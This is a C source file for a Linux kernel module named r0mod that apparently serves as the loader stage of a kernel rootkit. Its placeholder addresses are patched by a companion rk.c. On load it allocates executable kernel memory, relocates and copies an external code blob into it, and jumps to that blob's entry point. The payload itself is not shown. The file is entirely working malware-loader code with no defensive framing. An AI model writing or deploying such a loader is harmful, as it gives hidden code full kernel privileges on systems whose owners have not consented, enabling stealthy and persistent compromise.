#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/unistd.h>   // syscalls
#include <linux/vmalloc.h>  // __vmalloc

#include <r0mod/global.h>

/* patched by rk.c:insmod() */
unsigned long marker        = 0xdeadb33f;
unsigned long kstart        = -1;
unsigned long klen          = -1;
unsigned long kenter        = -1;
unsigned char *rkmem = (void *)-1;
int (*reloc)(unsigned char *, void (*pk)(char *, ...)) = (void *)-1;

static int __init r0mod_init(void)
{
    int i;
    int (*kinit)(void);

    printk("<0>" "Module starting...\n");

    rkmem = __vmalloc(8192 * 3, GFP_KERNEL, PAGE_KERNEL_EXEC);
    printk("<0>" "rkmem: 0x%p\n", rkmem);

    reloc(rkmem, (void*)&printk);
    for(i = 0; i < klen; i++)
        *(rkmem + i) = *(unsigned char *)(kstart + i);

    kinit = (void *)(kenter - kstart);
    kinit = (void *)rkmem + (unsigned long)kinit;

    return kinit();
}


static void __exit r0mod_exit(void)
{
    printk("<0>" "Module ending...\n");
}

MODULE_LICENSE("GPL");
module_init(r0mod_init);
module_exit(r0mod_exit);
